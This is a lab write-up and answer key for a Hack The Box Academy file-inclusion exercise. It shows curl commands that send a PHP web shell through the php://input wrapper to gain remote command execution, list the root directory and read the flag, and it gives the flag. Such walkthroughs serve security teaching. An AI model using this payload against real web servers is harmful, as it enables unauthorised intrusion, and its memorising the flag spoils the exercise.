# Section 05: PHP Wrappers

Module: 20. File Inclusion

---

## Questions & Answers

### 1. Try to gain RCE using one of the PHP wrappers and read the flag at /

Context:
```bash
┌─[eu-academy-2]─[10.10.15.146]─[htb-ac-2162140@htb-pwrdcnac6c-htb-cloud-com]─[~]
└──╼ [★]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://154.57.164.77:32560/index.php?language=php://input&cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

┌─[eu-academy-2]─[10.10.15.146]─[htb-ac-2162140@htb-pwrdcnac6c-htb-cloud-com]─[~]
└──╼ [★]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://154.57.164.77:32560/index.php?language=php://input&cmd=ls%20/"
37809e2f8952f06139011994726d9ef1.txt
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
┌─[eu-academy-2]─[10.10.15.146]─[htb-ac-2162140@htb-pwrdcnac6c-htb-cloud-com]─[~]
└──╼ [★]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://154.57.164.77:32560/index.php?language=php://input&cmd=cat%20/37809e2f8952f06139011994726d9ef1.txt"
HTB{d!$46l3_r3m0t3_url_!nclud3}
```

**Answer:** `HTB{d!$46l3_r3m0t3_url_!nclud3}`

---

[Back to Module Index](./README.md)
